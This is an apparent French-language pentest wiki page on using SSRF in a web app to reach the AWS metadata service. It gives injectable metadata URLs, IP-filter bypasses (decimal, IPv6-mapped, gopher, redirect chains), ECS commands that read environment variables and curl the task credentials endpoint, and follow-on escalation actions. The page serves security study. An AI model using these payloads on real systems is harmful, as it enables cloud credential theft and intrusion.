---
title: "SSRF : extraire les identifiants d'instance via une application web"
description: "Enchaîner une falsification de requête côté serveur vers 169.254.169.254 pour extraire les identifiants du rôle d'instance depuis une application web."
keywords:
  - SSRF
  - 169.254.169.254
  - rôle d'instance
  - application web
  - metadata
---

# SSRF

Lorsqu'une application web s'exécutant sur EC2 peut être contrainte d'émettre une requête vers une URL choisie par l'attaquant, il suffit de la pointer vers le point de terminaison de métadonnées pour que la réponse livre les identifiants du rôle d'instance. C'est le pont entre une vulnérabilité web et des identifiants cloud complets, et c'est pourquoi la [SSRF](../../../../../server/web/code/injection/request-forgery/index.md) est traitée comme une technique d'obtention d'identifiants cloud.

## La requête centrale

```
# any SSRF sink: image fetcher, webhook, URL preview, PDF renderer
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

Sur IMDSv2, l'application doit être amenée à émettre un `PUT` pour obtenir le jeton et à envoyer l'en-tête correspondant ; voir [IMDSv2](imdsv2.md). Lorsque seul un GET est possible, une instance restée en [IMDSv1](imdsv1.md) renvoie directement les identifiants.

## Contournements lorsque l'IP littérale est filtrée

```
http://169.254.169.254/      ->  http://[::ffff:169.254.169.254]/
                                  http://2852039166/            (decimal)
                                  http://metadata.google.internal (wrong cloud, but test)
                                  gopher://169.254.169.254/...  (where the fetcher honors gopher)
# DNS rebinding and redirect-based bypasses where the fetcher follows 3xx
# open-redirect chain: SSRF -> an attacker redirector -> 169.254.169.254
```

## ECS et Fargate

Les tâches n'utilisent pas `169.254.169.254` ; elles exposent les identifiants sur un chemin propre à chaque tâche derrière `169.254.170.2`. Lisez l'URI relative depuis l'environnement propre à la tâche, puis récupérez-la, ce qu'une SSRF au sein de la tâche peut atteindre avec un simple GET et sans échange de jeton :

```bash
cat /proc/self/environ | tr '\0' '\n' | grep AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```

## Notes d'exploitation

- La mécanique de la SSRF web (points d'injection, filtres, contournements par redirection et DNS rebinding) est traitée dans [request forgery](../../../../../server/web/code/injection/request-forgery/index.md) ; cette page ne couvre que la charge utile AWS.
- Une fois les identifiants du rôle exportés, les droits propres au rôle peuvent en forger d'autres : `sts:AssumeRole`, `iam:CreateAccessKey`, `ecr:GetAuthorizationToken`, `cognito-identity:GetCredentialsForIdentity`, `redshift:GetClusterCredentials`, `sso:GetRoleCredentials`, `lightsail:GetInstanceAccessDetails`, ainsi que les jetons de connexion `rds-db` ; voir [credential brokers](../credential-brokers.md).

## Outils

- **Burp Suite** / scripts personnalisés pour piloter le point d'injection SSRF.
- **Pacu** une fois les identifiants volés exportés.

## Références

- [HackTricks Cloud: SSRF to IMDS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [AWS: instance metadata service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
